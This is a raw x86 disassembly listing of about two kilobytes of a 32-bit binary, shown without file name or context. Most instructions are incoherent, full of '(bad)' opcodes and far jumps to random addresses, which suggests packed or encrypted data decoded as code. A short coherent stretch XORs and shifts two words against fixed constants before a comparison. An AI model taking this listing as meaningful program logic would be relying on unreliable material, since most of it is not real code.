  40e6c4:	aam    0x5b
  40e6c6:	push   es
  40e6c7:	(bad)  
  40e6c9:	sbb    esp,esi
  40e6cb:	jns    0x40e689
  40e6cd:	jmp    0x6632:0x73aa90eb
  40e6d4:	inc    ecx
  40e6d5:	iret   
  40e6d6:	xchg   ecx,eax
  40e6d7:	add    DWORD PTR ds:0xe8db8204,esp
  40e6dd:	jno    0x40e6d9
  40e6df:	hlt    
  40e6e0:	jl     0x40e6ad
  40e6e2:	mov    ebp,0x520997bd
  40e6e7:	jno    0x40e72c
  40e6e9:	and    eax,0xe6173382
  40e6ee:	push   edx
  40e6ef:	call   0xe220:0x78e7d202
  40e6f6:	dec    edx
  40e6f7:	inc    ecx
  40e6f8:	cs in  eax,0x78
  40e6fb:	or     BYTE PTR [eax-0x39],0x3d
  40e6ff:	sbb    dh,dl
  40e701:	push   ecx
  40e702:	ret    
  40e703:	adc    BYTE PTR ds:0xde5216b3,0x5c
  40e70a:	stos   BYTE PTR es:[edi],al
  40e70b:	xlat   BYTE PTR ds:[ebx]
  40e70c:	iret   
  40e70d:	sbb    dh,BYTE PTR [ebx-0x25c53c7b]
  40e713:	into   
  40e714:	frstor [esi+0x64]
  40e717:	fmul   DWORD PTR [ebx]
  40e719:	in     al,0xe1
  40e71b:	xchg   edi,eax
  40e71c:	sahf   
  40e71d:	daa    
  40e71e:	pop    esp
  40e71f:	xchg   ebp,eax
  40e720:	shl    BYTE PTR [ebx+0x7a],0x7f
  40e724:	push   ss
  40e725:	jnp    0x40e76d
  40e727:	lds    eax,FWORD PTR [esi]
  40e729:	popa   
  40e72a:	rcl    BYTE PTR [edi],1
  40e72c:	pushf  
  40e72d:	sub    edx,edx
  40e72f:	not    BYTE PTR [ebx]
  40e731:	iret   
  40e732:	fwait
  40e733:	inc    esp
  40e734:	mov    ah,0x97
  40e736:	dec    ecx
  40e737:	pop    eax
  40e738:	or     BYTE PTR ds:[ecx+0x5222ef45],0x71
  40e740:	sub    DWORD PTR [esi],0x1b
  40e743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e744:	cmp    eax,DWORD PTR [ecx]
  40e746:	mov    cl,0x36
  40e748:	xchg   edx,eax
  40e749:	push   esp
  40e74a:	dec    edx
  40e74b:	cmp    DWORD PTR [ecx],esi
  40e74d:	push   ebp
  40e74e:	into   
  40e74f:	cmc    
  40e750:	pop    ebx
  40e751:	adc    DWORD PTR [edx+0x78dae78c],edx
  40e757:	cmp    eax,0x7d89a79e
  40e75c:	(bad)  
  40e75d:	jnp    0x40e6f2
  40e75f:	rol    BYTE PTR [edi],1
  40e761:	gs mov edx,0xccf604ab
  40e767:	xor    ah,ch
  40e769:	sub    DWORD PTR [edi],esp
  40e76b:	fwait
  40e76c:	inc    eax
  40e76d:	sbb    eax,0xf3d2018e
  40e772:	xchg   ecx,eax
  40e773:	mov    ds:0xec278a47,eax
  40e778:	cmp    ecx,DWORD PTR [ebx]
  40e77a:	xchg   BYTE PTR [ebp+0x22],al
  40e77d:	nop
  40e77e:	(bad)
  40e782:	fwait
  40e783:	push   esp
  40e784:	fs out 0xe2,eax
  40e787:	jp     0x40e7c7
  40e789:	cmp    eax,0x5f872727
  40e78e:	add    esi,DWORD PTR [edx-0x67]
  40e791:	xchg   esp,eax
  40e792:	(bad)  
  40e793:	ss or  cl,bl
  40e796:	mov    WORD PTR [ebx+0x3da50fd4],ds
  40e79c:	and    dh,0xf0
  40e79f:	ror    DWORD PTR [esi-0x70],cl
  40e7a2:	test   eax,0xf9a6b38b
  40e7a7:	push   edi
  40e7a8:	leave  
  40e7a9:	add    al,0x10
  40e7ab:	adc    BYTE PTR [edi-0xe],dh
  40e7ae:	imul   ecx,DWORD PTR [esi],0xffffffb5
  40e7b1:	or     ecx,DWORD PTR [edi+0x6b]
  40e7b4:	pop    ecx
  40e7b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7b6:	xlat   BYTE PTR ds:[ebx]
  40e7b7:	push   edi
  40e7b8:	jecxz  0x40e742
  40e7ba:	ds out 0x43,eax
  40e7bd:	mov    al,ds:0xf3723ffa
  40e7c2:	in     eax,dx
  40e7c3:	add    eax,0x844109d3
  40e7c8:	rol    DWORD PTR ds:[edi],1
  40e7cb:	loopne 0x40e7e6
  40e7cd:	inc    edx
  40e7ce:	mov    eax,gs:0xa3de8b12
  40e7d4:	mov    esp,0x24158d68
  40e7d9:	xchg   esi,eax
  40e7da:	mov    bl,0x53
  40e7dc:	xor    BYTE PTR [ebp-0x39fdfd79],dh
  40e7e2:	imul   ebx,DWORD PTR [edx+0x75ef3999],0xcceac94
  40e7ec:	out    dx,al
  40e7ed:	inc    edi
  40e7ee:	mov    bl,0xe4
  40e7f0:	int    0xdd
  40e7f2:	aaa    
  40e7f3:	retf   0x85f0
  40e7f6:	nop
  40e7f7:	rol    BYTE PTR [ecx+0x67],cl
  40e7fa:	xor    cl,dh
  40e7fc:	mov    cl,0xe3
  40e7fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7ff:	xor    al,0xb2
  40e801:	js     0x40e810
  40e803:	dec    esp
  40e804:	pavgw  mm4,QWORD PTR [ebx+0x2d]
  40e808:	push   ebp
  40e809:	je     0x40e851
  40e80b:	sbb    eax,DWORD PTR [ecx]
  40e80d:	popf   
  40e80e:	fisubr DWORD PTR [eax]
  40e810:	xchg   DWORD PTR [edx],edi
  40e812:	jecxz  0x40e797
  40e814:	fdiv   st(1),st
  40e816:	(bad)  
  40e818:	nop
  40e819:	std    
  40e81a:	jb     0x40e7f7
  40e81c:	mov    ebp,ebx
  40e81e:	sub    ebp,DWORD PTR [ecx+0x5]
  40e821:	jns    0x40e882
  40e823:	loop   0x40e83a
  40e825:	pushf  
  40e826:	or     eax,0x78abeba8
  40e82b:	cdq    
  40e82c:	mov    ebp,DWORD PTR [edi+0x10471574]
  40e832:	adc    ecx,DWORD PTR [edx-0x9]
  40e835:	repz and ch,cl
  40e838:	jnp    0x40e7cd
  40e83a:	data16 or al,0x3e
  40e83d:	icebp  
  40e83e:	shr    BYTE PTR [edi+eax*4+0x5c2379aa],0x72
  40e846:	outs   dx,DWORD PTR ds:[esi]
  40e847:	xchg   esp,eax
  40e848:	mov    ah,0x7c
  40e84a:	ss icebp 
  40e84c:	or     al,0xb8
  40e84e:	add    BYTE PTR [edi-0x40],0xc1
  40e852:	fidivr DWORD PTR [ecx+0x2a]
  40e855:	ror    DWORD PTR [edi+edi*2],cl
  40e858:	test   al,0x93
  40e85a:	push   esi
  40e85b:	lods   eax,DWORD PTR ds:[esi]
  40e85c:	fld    QWORD PTR [edi+esi*4]
  40e85f:	sub    BYTE PTR [esi-0xa],bl
  40e862:	jp     0x40e87e
  40e864:	xchg   esp,eax
  40e865:	xchg   edx,eax
  40e866:	inc    esi
  40e867:	sbb    eax,esi
  40e869:	jge    0x40e85b
  40e86b:	pop    eax
  40e86c:	jno    0x40e802
  40e86e:	scas   eax,DWORD PTR es:[edi]
  40e86f:	in     eax,0xce
  40e871:	mov    ds:0xc7967e2d,eax
  40e876:	pop    ss
  40e877:	adc    dh,BYTE PTR [ebp+0x330c623e]
  40e87d:	sub    BYTE PTR [edi+0x7e],0xea
  40e881:	iret   
  40e882:	xor    BYTE PTR [edx-0x12d60be5],0x4e
  40e889:	lea    ecx,[esp+edi*4-0x73]
  40e88d:	out    dx,eax
  40e88e:	out    0x4b,eax
  40e890:	enter  0xdc5,0x37
  40e894:	out    dx,eax
  40e895:	cdq    
  40e896:	bound  ebp,QWORD PTR [eax-0x3f3d3bd2]
  40e89c:	push   cs
  40e89d:	xor    ebp,DWORD PTR [ebx-0x3acfa0a]
  40e8a3:	push   esi
  40e8a4:	and    DWORD PTR [edx+edx*4-0x8],ebx
  40e8a8:	jae    0x40e83d
  40e8aa:	repz int 0xbb
  40e8ad:	and    bh,bl
  40e8af:	ret    0xd04f
  40e8b2:	add    BYTE PTR [edx+esi*4-0x6eb9019],0xb9
  40e8ba:	rcl    DWORD PTR [ecx],1
  40e8bc:	je     0x40e8fc
  40e8be:	and    eax,0xa1e4845e
  40e8c3:	mov    bl,0x3a
  40e8c5:	call   0x7f51815e
  40e8ca:	adc    eax,0x21
  40e8cd:	cs mov eax,0xe9ac0df0
  40e8d3:	mov    ecx,0x9166f87c
  40e8d8:	(bad)  
  40e8da:	ror    BYTE PTR [ecx],cl
  40e8dc:	jne    0x40e878
  40e8de:	push   0x2316fb77
  40e8e3:	lea    eax,[esi-0x3e]
  40e8e6:	sub    al,0xb6
  40e8e8:	daa    
  40e8e9:	sbb    eax,0x9444ac84
  40e8ee:	ret    
  40e8ef:	ins    BYTE PTR es:[edi],dx
  40e8f0:	repz and al,0x60
  40e8f3:	mov    al,0xc7
  40e8f5:	or     al,0xbe
  40e8f7:	cmp    bh,dl
  40e8f9:	out    0x3e,al
  40e8fb:	jge    0x40e8b8
  40e8fd:	and    ch,BYTE PTR [eax+0x1c]
  40e900:	(bad)  
  40e901:	and    edi,ecx
  40e903:	xchg   esi,eax
  40e904:	jno    0x40e94c
  40e906:	fist   WORD PTR [esi-0x44]
  40e909:	in     eax,0x98
  40e90b:	fwait
  40e90c:	in     al,0x2f
  40e90e:	jmp    0x998b:0x2070c0a4
  40e915:	ror    ch,0xeb
  40e918:	call   0x5e2458c
  40e91d:	mov    BYTE PTR [edi-0x7ffa33e4],ch
  40e923:	int3   
  40e924:	out    0xf8,al
  40e926:	mov    DWORD PTR [edi],ebp
  40e928:	mov    edi,0x2545ad98
  40e92d:	(bad)  
  40e92e:	test   DWORD PTR [esi],0x5e159e53
  40e934:	fidivr DWORD PTR [eax-0x1be3bcb9]
  40e93a:	dec    BYTE PTR [esi+eax*4]
  40e93d:	pop    esp
  40e93e:	jecxz  0x40e994
  40e940:	test   al,0xd2
  40e942:	mov    bh,BYTE PTR [ecx+0x55380cfb]
  40e948:	sbb    BYTE PTR [ecx],al
  40e94a:	inc    esp
  40e94b:	fnsave [eax]
  40e94d:	xchg   ebp,eax
  40e94e:	sbb    BYTE PTR [edx-0x51],dh
  40e951:	data16 jnp 0x40e903
  40e954:	dec    ecx
  40e955:	cmp    BYTE PTR [ebp+0x5de6af80],bl
  40e95b:	(bad)  
  40e95c:	in     eax,dx
  40e95d:	xor    eax,0x314c9fd0
  40e962:	out    0x13,al
  40e964:	test   edx,ecx
  40e966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e967:	sub    cl,dh
  40e969:	inc    esp
  40e96a:	out    0x7b,al
  40e96c:	xor    ecx,esp
  40e96e:	xchg   ebx,eax
  40e96f:	adc    esi,DWORD PTR [edi+ebx*4]
  40e972:	dec    edi
  40e973:	je     0x40e996
  40e975:	icebp  
  40e976:	jmp    0xf7f71cf
  40e97b:	test   BYTE PTR [ecx],ah
  40e97d:	mov    ah,0x3a
  40e97f:	cmc    
  40e980:	pop    edx
  40e981:	inc    edi
  40e982:	cmp    BYTE PTR [edx-0x36f2d637],dl
  40e988:	mov    bl,0x69
  40e98a:	push   0x43ec8e4a
  40e98f:	outs   dx,BYTE PTR ds:[esi]
  40e990:	push   ecx
  40e991:	xchg   ebp,eax
  40e992:	add    esp,DWORD PTR [edi+esi*8+0x49]
  40e996:	mov    al,ds:0xe3dcd8bb
  40e99b:	stos   DWORD PTR es:[edi],eax
  40e99c:	es cli 
  40e99e:	xchg   DWORD PTR [edx+ebp*1-0x3],eax
  40e9a2:	xchg   edi,eax
  40e9a3:	sar    esi,1
  40e9a5:	cli    
  40e9a6:	or     edi,ebx
  40e9a8:	and    DWORD PTR [ecx],edi
  40e9aa:	aad    0xd1
  40e9ac:	sbb    DWORD PTR [eax*1+0x5de7ea17],ecx
  40e9b3:	xchg   edi,eax
  40e9b4:	repz dec edi
  40e9b6:	mov    ebx,0x88a132a0
  40e9bb:	call   ebp
  40e9bd:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40e9bf:	pop    ecx
  40e9c0:	push   esi
  40e9c1:	add    al,0x25
  40e9c3:	or     al,0x89
  40e9c5:	and    DWORD PTR [edi+0x6b047df5],edi
  40e9cb:	or     dl,BYTE PTR [esi-0x32]
  40e9ce:	push   edi
  40e9cf:	repnz adc edx,DWORD PTR [edi]
  40e9d2:	inc    esi
  40e9d3:	xor    al,0xbc
  40e9d5:	xchg   ebx,eax
  40e9d6:	and    ebx,DWORD PTR [ebx+0x44]
  40e9d9:	cmp    DWORD PTR [edx],edi
  40e9db:	mov    edx,0x8f2b6ad5
  40e9e0:	mov    ebp,0x33dcf9d5
  40e9e5:	out    0x4f,eax
  40e9e7:	cwde   
  40e9e8:	pop    es
  40e9e9:	cmp    dl,al
  40e9eb:	inc    ebp
  40e9ec:	sub    al,0x94
  40e9ee:	in     al,dx
  40e9ef:	gs iret 
  40e9f1:	pop    ss
  40e9f2:	or     DWORD PTR [edi+0x5],eax
  40e9f5:	inc    edx
  40e9f6:	or     edx,0xffffffba
  40e9f9:	ret    0x568d
  40e9fc:	pop    eax
  40e9fd:	adc    al,0xc7
  40e9ff:	xchg   ecx,eax
  40ea00:	test   BYTE PTR [ebx-0x3263b7d8],ch
  40ea06:	mov    dh,0x5d
  40ea08:	mov    ah,0x51
  40ea0a:	xor    edi,DWORD PTR [edx]
  40ea0c:	pop    ebx
  40ea0d:	test   dl,dh
  40ea0f:	leave  
  40ea10:	in     al,dx
  40ea11:	aaa    
  40ea12:	mov    ebx,0xfbdc7799
  40ea17:	ror    DWORD PTR [edx+0x77],cl
  40ea1a:	test   eax,0x470763e5
  40ea1f:	push   ebx
  40ea20:	es sahf 
  40ea22:	cld    
  40ea23:	outs   dx,BYTE PTR ds:[esi]
  40ea24:	leave  
  40ea25:	les    esi,FWORD PTR [edi+eiz*8+0x64]
  40ea29:	sbb    edx,DWORD PTR [edi-0x4f52791]
  40ea2f:	push   DWORD PTR cs:[ecx-0x16e382c4]
  40ea36:	or     ah,BYTE PTR [ecx+0x4a]
  40ea39:	mov    al,ds:0x7eeda64f
  40ea3e:	sub    BYTE PTR ds:0x29bcb9db,ah
  40ea44:	jle    0x40eaa0
  40ea46:	ja     0x40e9d9
  40ea48:	repnz and BYTE PTR [edi],0x21
  40ea4c:	push   0xffffff8a
  40ea4e:	cli    
  40ea4f:	enter  0xee74,0xde
  40ea53:	push   ds
  40ea54:	ficomp WORD PTR [edx-0x12485bf8]
  40ea5a:	jo     0x40ea61
  40ea5c:	add    ecx,ebp
  40ea5e:	mov    al,0xa2
  40ea60:	fnstsw WORD PTR gs:[eax-0x59]
  40ea64:	jecxz  0x40ea27
  40ea66:	(bad)  
  40ea67:	mov    eax,0xbac60bfc
  40ea6c:	cmp    BYTE PTR [ecx+0x5a],dl
  40ea6f:	xor    dl,BYTE PTR [edi+eax*8-0x30a4f4ba]
  40ea76:	mov    es:0xa1a06747,al
  40ea7c:	jmp    0xc106f5c9
  40ea81:	mov    esp,0xe106bd10
  40ea86:	and    bh,dl
  40ea88:	call   0xec30:0x58ebd5bd
  40ea8f:	jae    0x40eab2
  40ea91:	cmp    al,BYTE PTR [eax+eax*1-0x44]
  40ea95:	pop    esi
  40ea96:	add    BYTE PTR [edi],bl
  40ea98:	mov    al,ds:0xf2b49572
  40ea9d:	cld    
  40ea9e:	dec    ebp
  40ea9f:	adc    DWORD PTR [ebx+edx*4],ebx
  40eaa2:	faddp  st(7),st
  40eaa4:	and    DWORD PTR [ecx-0x24],ecx
  40eaa7:	test   edx,edi
  40eaa9:	mov    BYTE PTR [edi+edx*2-0x49],ch
  40eaad:	fbld   TBYTE PTR [eax]
  40eaaf:	inc    DWORD PTR [ebp+0x20]
  40eab2:	mov    esp,0x2185bf4f
  40eab7:	ins    DWORD PTR es:[edi],dx
  40eab8:	int    0x6c
  40eaba:	repnz pop esi
  40eabc:	and    esp,DWORD PTR [eax+0x62b3628f]
  40eac2:	pusha  
  40eac3:	retf   0x7488
  40eac6:	xor    DWORD PTR [ebx],esi
  40eac8:	mov    dl,0x48
  40eaca:	jp     0x40ead4
  40eacc:	addr16 dec esi
  40eace:	xor    al,0x4f
  40ead0:	jp     0x40eab1
  40ead2:	xchg   ebp,eax
  40ead3:	jmp    0x215d:0x611586d8
  40eada:	icebp  
  40eadb:	aaa    
  40eadc:	jmp    0x9490:0x16ceae72
  40eae3:	jle    0x40ea82
  40eae5:	push   ebx
  40eae6:	scas   al,BYTE PTR es:[edi]
  40eae7:	test   eax,0xa9287108
  40eaec:	ret    
  40eaed:	imul   esi,DWORD PTR es:[edi],0xffffffc8
  40eaf1:	out    0xe2,eax
  40eaf3:	push   cs
  40eaf4:	scas   al,BYTE PTR es:[edi]
  40eaf5:	pop    edx
  40eaf6:	ss jo  0x40ea81
  40eaf9:	mov    dh,dh
  40eafb:	jmp    0xd1e17fff
  40eb00:	mov    bl,0xfa
  40eb02:	add    eax,0xf086c000
  40eb07:	rcl    eax,1
  40eb09:	pmuludq mm0,mm6
  40eb0c:	outs   dx,DWORD PTR ds:[esi]
  40eb0d:	mov    eax,DWORD PTR [ebx]
  40eb0f:	mov    DWORD PTR [ebp-0x2c],edx
  40eb12:	mov    edx,DWORD PTR [ebx+0x4]
  40eb15:	mov    edx,eax
  40eb17:	xor    eax,eax
  40eb19:	shl    edx,0x1e
  40eb1c:	xor    edx,0xc0000000
  40eb22:	mov    DWORD PTR [ebp-0x70],eax
  40eb25:	mov    eax,DWORD PTR [ebx]
  40eb27:	mov    DWORD PTR [ebp-0x6c],edx
  40eb2a:	mov    edx,DWORD PTR [ebx+0x4]
  40eb2d:	xor    eax,0xba699573
  40eb32:	xor    edx,0x9c0a89d8
  40eb38:	shrd   eax,edx,0x2
  40eb3c:	or     eax,DWORD PTR [ebp-0x70]
  40eb3f:	shr    edx,0x2
  40eb42:	mov    DWORD PTR [ebp-0x38],eax
  40eb45:	mov    eax,edx
  40eb47:	or     eax,DWORD PTR [ebp-0x6c]
  40eb4a:	mov    DWORD PTR [ebp-0x5c],edx
  40eb4d:	cmp    ecx,DWORD PTR [ebp-0x38]
  40eb50:	jne    0x40da02
  40eb56:	cmp    DWORD PTR [ebp-0x2c],eax
  40eb59:	je     0x41a17f
  40eb5f:	jmp    0x40da02
  40eb64:	mov    eax,DWORD PTR [esi]
  40eb66:	mov    ecx,DWORD PTR [esi+0x4]
  40eb69:	mov    ecx,eax
  40eb6b:	shl    ecx,0x1e
  40eb6e:	xor    ecx,0xc0000000
  40eb74:	mov    DWORD PTR [ebp+0x14],ecx
  40eb77:	mov    ecx,DWORD PTR [esi]
  40eb79:	mov    edx,DWORD PTR [esi+0x4]
  40eb7c:	xor    ecx,0xba699573
  40eb82:	xor    edx,0x9c0a89d8
  40eb88:	shrd   ecx,edx,0x2
  40eb8c:	xor    eax,eax
  40eb8e:	or     ecx,eax
  40eb90:	mov    eax,DWORD PTR [ebx]
  40eb92:	mov    DWORD PTR [ebp-0x68],ecx
  40eb95:	mov    ecx,DWORD PTR [ebx+0x4]
  40eb98:	jmp    0x40f122
  40eb9d:	and    eax,0x9542a757
  40eba2:	adc    bl,BYTE PTR [eax]
  40eba4:	xor    BYTE PTR [eax],bl
  40eba6:	mov    al,ds:0x82c9a805
  40ebab:	xor    al,0x68
  40ebad:	mov    cs,WORD PTR [edx+0x43d1616]
  40ebb3:	push   ss
  40ebb4:	push   ss
  40ebb5:	or     al,BYTE PTR [ebx]
  40ebb7:	ins    DWORD PTR es:[edi],dx
  40ebb8:	push   ds
  40ebb9:	xchg   ebx,eax
  40ebba:	inc    esp
  40ebbb:	sub    esi,DWORD PTR [ecx+0x6e3dde98]
  40ebc1:	cld    
  40ebc2:	push   esp
  40ebc3:	or     esp,DWORD PTR [ecx-0x7a630d63]
  40ebc9:	out    0x9,al
  40ebcb:	loopne 0x40ebc3
  40ebcd:	in     al,dx
  40ebce:	repnz pop ds
  40ebd0:	cld    
  40ebd1:	mov    WORD PTR ds:0x306d982d,ds
  40ebd7:	jo     0x40ebb9
  40ebd9:	(bad)
  40ebdc:	bound  eax,QWORD PTR [edi+0x76f0118]
  40ebe2:	pop    ss
  40ebe3:	pop    esp
  40ebe4:	test   al,0x6f
  40ebe6:	inc    esp
  40ebe7:	arpl   dx,cx
  40ebe9:	sub    al,0xe6
  40ebeb:	cmp    DWORD PTR [ebp+esi*8+0x7],edx
  40ebef:	sub    eax,0x8496c5c4
  40ebf4:	mov    bh,0xe8
  40ebf6:	pop    ebp
  40ebf7:	dec    ecx
  40ebf8:	(bad)  
  40ebf9:	pop    esp
  40ebfa:	and    esp,DWORD PTR [eax]
  40ebfc:	mov    dh,0xce
  40ebfe:	lods   al,BYTE PTR ds:[esi]
  40ebff:	xchg   esp,eax
  40ec00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec01:	mov    BYTE PTR [ebp+ecx*2+0x46],ch
  40ec05:	and    al,0xfb
  40ec07:	lods   al,BYTE PTR ds:[esi]
  40ec08:	xor    ecx,edi
  40ec0a:	or     al,0xdd
  40ec0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec0d:	ins    DWORD PTR es:[edi],dx
  40ec0e:	inc    edx
  40ec0f:	push   es
  40ec10:	push   cs
  40ec11:	fld    QWORD PTR [esi-0x50]
  40ec14:	clc    
  40ec15:	aas    
  40ec16:	mov    BYTE PTR [edi+0x7],bh
  40ec19:	push   ebp
  40ec1a:	fcmovne st,st(6)
  40ec1c:	jo     0x40ebc7
  40ec1e:	xchg   esp,eax
  40ec1f:	ja     0x40ec35
  40ec21:	or     eax,0x8045e9e7
  40ec26:	mov    edi,edi
  40ec28:	sti    
  40ec29:	mov    bl,0x48
  40ec2b:	sub    DWORD PTR [esi+eiz*8-0x66],eax
  40ec2f:	lods   eax,DWORD PTR ds:[esi]
  40ec30:	arpl   WORD PTR [edi+0x5ef4b832],di
  40ec36:	pop    eax
  40ec37:	ins    BYTE PTR es:[edi],dx
  40ec38:	xor    eax,0x8edcb911
  40ec3d:	push   ss
  40ec3e:	jmp    0x40eca3
  40ec40:	sub    DWORD PTR [esi],esp
  40ec42:	int    0x59
  40ec44:	aaa    
  40ec45:	test   eax,0xde242e37
  40ec4a:	imul   BYTE PTR [ebx+0x49a8c8df]
  40ec50:	xchg   esp,eax
  40ec51:	(bad)  [eax+0x4a982309]
  40ec57:	adc    DWORD PTR [edx-0x167209ee],ecx
  40ec5d:	sub    esp,DWORD PTR [ebx-0x64]
  40ec60:	scas   eax,DWORD PTR es:[edi]
  40ec61:	lock mov ebx,0xd0472fe0
  40ec67:	cs pop ds
  40ec69:	clc    
  40ec6a:	or     dl,BYTE PTR [ecx]
  40ec6c:	inc    edx
  40ec6d:	(bad)  
  40ec6e:	sbb    BYTE PTR [ecx+0x7c1f0183],al
  40ec74:	push   esi
  40ec75:	std    
  40ec76:	dec    ecx
  40ec77:	or     esp,esp
  40ec79:	(bad)  
  40ec7a:	loopne 0x40ec4b
  40ec7c:	mov    eax,ds:0x7b30dbc3
  40ec81:	push   cs
  40ec82:	(bad)  
  40ec83:	jle    0x40ecbc
  40ec85:	cs (bad) 
  40ec87:	int3   
  40ec88:	and    BYTE PTR [ebx+0x65d79018],bh
  40ec8e:	cmp    edx,edx
  40ec90:	add    al,0x91
  40ec92:	pop    ebx
  40ec94:	cmp    al,0xc5
  40ec96:	push   eax
  40ec97:	jp     0x40ec8a
  40ec99:	shl    DWORD PTR [eax-0x4e31b075],0x8a
  40eca0:	add    edi,DWORD PTR [esi-0x48ba449e]
  40eca6:	xor    esi,ebp
  40eca8:	nop
  40eca9:	(bad)  
  40ecaa:	push   0x73f5af1b
  40ecaf:	gs in  eax,0xe
  40ecb2:	push   0x35d4cc23
  40ecb7:	push   sp
  40ecb9:	ja     0x40ecf9
  40ecbb:	pop    ebp
  40ecbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecbd:	add    al,bh
  40ecbf:	repz les edx,FWORD PTR [edi]
  40ecc2:	inc    ebx
  40ecc3:	sub    BYTE PTR [edx-0xb],ch
  40ecc6:	fisttp DWORD PTR [esi-0x3d7b8ed7]
  40eccc:	mov    bl,al
  40ecce:	ins    BYTE PTR es:[edi],dx
  40eccf:	cwde   
  40ecd0:	cld    
  40ecd1:	adc    DWORD PTR [esi],ebp
  40ecd3:	mov    al,ds:0x8e50968d
  40ecd8:	rcl    DWORD PTR [ebx+0x79b9a3c4],cl
  40ecde:	test   DWORD PTR [edx],eax
  40ece0:	sub    DWORD PTR [edx-0x72],eax
  40ece3:	sbb    DWORD PTR [ebx],esi
  40ece5:	xchg   ebx,eax
  40ece6:	fcomp  DWORD PTR [eax-0x2e]
  40ece9:	outs   dx,DWORD PTR ds:[esi]
  40eceb:	lahf   
  40ecec:	loope  0x40ecce
  40ecee:	ret    
  40ecef:	mov    ds:0xb19238a5,eax
  40ecf4:	mov    eax,ds:0x219b133b
  40ecf9:	xor    edx,DWORD PTR [esi-0x5c6ca696]
  40ecff:	into   
  40ed00:	stos   DWORD PTR es:[edi],eax
  40ed01:	adc    esi,DWORD PTR [ebp+ebp*1-0xb]
  40ed05:	inc    ecx
  40ed06:	push   es
  40ed07:	push   0xb805f043
  40ed0c:	jmp    0x113ae75a
  40ed11:	cmp    dh,BYTE PTR [edx+0x61d88b48]
  40ed17:	(bad)  [edx]
  40ed19:	sahf   
  40ed1a:	push   es
  40ed1b:	xchg   edx,eax
  40ed1c:	(bad)
  40ed20:	jb     0x40ed5c
  40ed22:	sbb    eax,0x6937f5bc
  40ed27:	pusha  
  40ed28:	push   ebp
  40ed29:	jp     0x40eda8
  40ed2b:	adc    edx,edi
  40ed2d:	mov    edi,0xb0b88525
  40ed32:	je     0x40ed99
  40ed34:	push   cs
  40ed35:	fiadd  WORD PTR [edi+0x743a2252]
  40ed3b:	ins    DWORD PTR es:[edi],dx
  40ed3c:	sbb    cl,BYTE PTR [ebp+0x1]
  40ed3f:	in     al,dx
  40ed40:	in     eax,0x8f
  40ed42:	lods   eax,DWORD PTR ds:[esi]
  40ed43:	mov    esp,0x7a2c8a26
  40ed48:	cmp    eax,0x2f0dbcf3
  40ed4d:	mov    cl,0xfe
  40ed4f:	cwde   
  40ed50:	imul   edi,ecx,0x8ee2c795
  40ed56:	les    ecx,FWORD PTR [edi+ebx*2-0x71]
  40ed5a:	nop
  40ed5b:	mov    ah,BYTE PTR [ebp+0x51]
  40ed5e:	jl     0x40ed06
  40ed60:	call   0x997e3ad6
  40ed65:	shl    BYTE PTR [edi],0x0
  40ed68:	xor    DWORD PTR [ebx-0x7b642b0],ebx
  40ed6e:	dec    edi
  40ed6f:	iret   
  40ed70:	je     0x40ed9f
  40ed72:	jecxz  0x40edc3
  40ed74:	fist   WORD PTR [esi]
  40ed76:	dec    ebx
  40ed77:	jmp    0x17de3c78
  40ed7c:	cmp    ebp,edx
  40ed7e:	mov    dh,0x60
  40ed80:	hlt    
  40ed81:	mov    al,ds:0x67f35dd5
  40ed86:	xor    eax,0x719dda4c
  40ed8b:	and    DWORD PTR [edi+0x3033e4f],ebp
  40ed91:	push   0xf25cc67a
  40ed96:	mov    bh,0xbc
  40ed98:	push   eax
  40ed99:	popf   
  40ed9a:	jo     0x40eda8
  40ed9c:	cli    
  40ed9d:	jge    0x40ed6a
  40ed9f:	push   edi
  40eda0:	sub    ah,0x93
  40eda3:	clc    
  40eda4:	cmc    
  40eda5:	jle    0x40ee19
  40eda7:	pop    eax
  40eda8:	push   ds
  40eda9:	lods   al,BYTE PTR ds:[esi]
  40edaa:	cs ja  0x40ee01
  40edad:	(bad)  
  40edae:	imul   ebp,esi,0x6ba85a8c
  40edb4:	sahf   
  40edb5:	(bad)  
  40edb6:	(bad)  
  40edb7:	cli    
  40edb8:	fimul  WORD PTR [esi+ecx*1+0x28b4ad54]
  40edbf:	mov    ecx,0xeaafaea7
  40edc4:	in     al,0xe8
  40edc6:	and    eax,ebx
  40edc8:	add    cl,BYTE PTR [ecx+0x6a]
  40edcb:	sbb    al,BYTE PTR [ebx-0x3f]
  40edce:	sbb    BYTE PTR [ecx-0x6d],0x7b
  40edd2:	mov    fs,WORD PTR [eax+ebp*4-0x6e47c009]
  40edd9:	xchg   ebx,eax
  40edda:	push   edi
  40eddb:	call   0xd641:0x8a1ac1eb
  40ede2:	mov    al,0x0
  40ede4:	mov    cl,0xe9
  40ede6:	call   0x8440:0x369e87da
  40eded:	hlt    
  40edee:	jmp    0x9649:0x62770067
  40edf5:	cmp    eax,0x8f4ad7f9
  40edfa:	lock adc DWORD PTR [edi-0x40021d4b],ebx
  40ee01:	sub    al,0xe2
  40ee03:	inc    eax
  40ee04:	(bad)  
  40ee05:	mov    ss,WORD PTR [esi+0x4b]
  40ee08:	je     0x40ee72
  40ee0a:	xchg   BYTE PTR [edi+edx*2],dl
  40ee0d:	pop    edi
  40ee0e:	rcl    DWORD PTR [esi+0x70],1
  40ee11:	dec    eax
  40ee12:	fisubr DWORD PTR [edi+ecx*1+0x21]
  40ee16:	xor    eax,0x55ffc39d
  40ee1b:	shr    DWORD PTR [edi],0x1c
  40ee1e:	iret   
  40ee1f:	push   cs
  40ee20:	retf   
  40ee21:	fstp   TBYTE PTR [edi]
  40ee23:	push   ds
  40ee24:	xor    ah,BYTE PTR [ecx-0xc559a7f]
  40ee2a:	cdq    
  40ee2b:	(bad)  
  40ee2c:	sar    ebx,cl
  40ee2e:	or     al,0xac
  40ee30:	dec    ecx
  40ee31:	ficom  DWORD PTR [ecx+0x348be3a6]
  40ee37:	jno    0x40ee24
  40ee39:	mov    eax,0x948c4bff
  40ee3e:	retf   
  40ee3f:	dec    edx
  40ee40:	dec    edx
  40ee41:	pop    esp
  40ee42:	inc    eax
  40ee43:	dec    eax
  40ee44:	xor    al,0xe5
